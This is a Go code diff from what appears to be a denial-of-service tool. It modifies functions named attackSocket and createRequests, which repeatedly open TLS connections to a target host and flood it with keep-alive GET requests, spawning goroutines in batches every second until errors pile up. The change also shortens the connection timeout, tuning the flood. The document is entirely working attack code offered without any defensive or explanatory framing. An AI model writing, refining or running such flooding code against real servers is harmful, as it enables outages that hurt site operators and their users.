@@ -9,13 +9,14 @@ import (
 	"time"
 )
 
-func createRequests(socket net.Conn, attackInfo *packages.AttackInfo, buffer []byte, errors *int32) {
+func createRequests(socket net.Conn, attackInfo *packages.AttackInfo, errors *int32) {
 	for index := 0; index < attackInfo.RequestRate; index++ {
-		go func(socket net.Conn, buffer []byte, errors *int32) {
+		go func(attackInfo *packages.AttackInfo, socket net.Conn, errors *int32) {
+			buffer := packages.GetBuffer(attackInfo)
 			if written, err := socket.Write(buffer); err != nil || written != len(buffer) {
 				atomic.AddInt32(errors, 1)
 			}
-		}(socket, buffer, errors)
+		}(attackInfo, socket, errors)
 	}
 }
 
@@ -34,17 +35,16 @@ func attackSocket(attackInfo *packages.AttackInfo) {
 			Host: attackInfo.Target.Host,
 			Port: 443,
 		},
-		Timeout: 5 * time.Second,
+		Timeout: 1 * time.Second,
 	}
 	socket, err := packages.GetClientConnection(options)
 	if err != nil {
 		return
 	}
-	buffer := []byte("GET " + attackInfo.Target.Path + " HTTP/1.1\r\nHost: " + attackInfo.Target.Host + "\r\nConnection: keep-alive\r\n\r\n")
 	var errors int32
 	for errors < 5 {
 		time.Sleep(1 * time.Second)
-		go createRequests(socket, attackInfo, buffer, &errors)
+		go createRequests(socket, attackInfo, &errors)
 	}
 }
 
